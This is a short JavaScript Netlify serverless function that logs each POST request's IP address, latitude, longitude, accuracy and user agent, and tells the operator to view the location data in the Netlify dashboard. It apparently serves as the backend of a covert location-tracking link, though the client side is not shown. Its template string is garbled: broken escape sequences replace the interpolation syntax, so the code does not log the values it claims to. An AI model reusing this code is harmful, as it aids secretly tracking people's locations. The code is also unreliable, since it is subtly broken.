exports.handler = async (event, context) => {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Method not allowed' };
  }

  try {
    const body = JSON.parse(event.body);
    const log = `\( {event.headers['client-ip'] || body.ip} | Lat: \){body.lat} | Lon: \( {body.lon} | Acc: \){body.acc} meters | UA: \( {body.ua} | Time: \){new Date().toISOString()}`;

    console.log(log);  // This saves the location data—view in Netlify dashboard!

    return {
      statusCode: 200,
      body: JSON.stringify({ message: 'Logged successfully!' })
    };
  } catch (error) {
    return { statusCode: 500, body: `Error: ${error.message}` };
  }
};
